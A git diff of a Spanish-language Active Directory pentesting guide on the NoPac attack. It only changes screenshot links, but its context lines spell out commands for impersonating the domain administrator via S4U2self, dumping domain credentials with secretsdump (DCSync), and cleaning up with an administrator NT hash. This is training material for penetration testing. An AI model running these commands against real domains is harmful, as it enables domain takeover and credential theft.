@@ -36,22 +36,22 @@ python getTGT.py -dc-ip '<nombre completo del DC en el dominio>' '<dominio>'/'<n
 # Devolvemos el nuevo equipo al nombre original
 python renameMachine.py -current-name '<nombre DC (nuevo equipo)>' -new-name 'samaccountname$' <dominio>/<user>:<pass>
 ```
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac2.png.gif?raw=true "NoPac manual 1")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac2.png?raw=true "NoPac manual 1")
 ```Bash
 # Obtenemos el ST (service ticket) con S4U2self usando el TGT previo
 export KRB5CCNAME=<nombre DC (nuevo equipo)>.ccache
 python getST.py -self -impersonate 'administrator' -altservice 'CIFS/<nombre completo del DC en el dominio>' -k -no-pass -dc-ip '<nombre completo del DC en el dominio>' '<dominio>'/'<nombre DC (nuevo equipo)>' -debug
 ```
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac3.png.gif?raw=true "NoPac manual 2")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac3.png?raw=true "NoPac manual 2")
 ```Bash
 # DCSync presentando el ST
 export KRB5CCNAME=administrator@CIFS_<nombre completo del DC en el dominio>@<dominio completo>.ccache
 python secretsdump.py -k -no-pass -dc-ip '<nombre completo del DC en el dominio>' @'<nombre completo del DC en el dominio>'
 ```
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac4.png.gif?raw=true "NoPac manual 3")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac4.png?raw=true "NoPac manual 3")
 ```Bash
 # Eliminamos el equipo creado
 python addcomputer.py -computer-name 'samaccountname$' -delete -dc-host <nombre completo del DC en el dominio> -domain-netbios <dominio> -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' '<dominio>/Administrator'
 ```
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac5.png.gif?raw=true "NoPac manual 4")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac5.png?raw=true "NoPac manual 4")
 
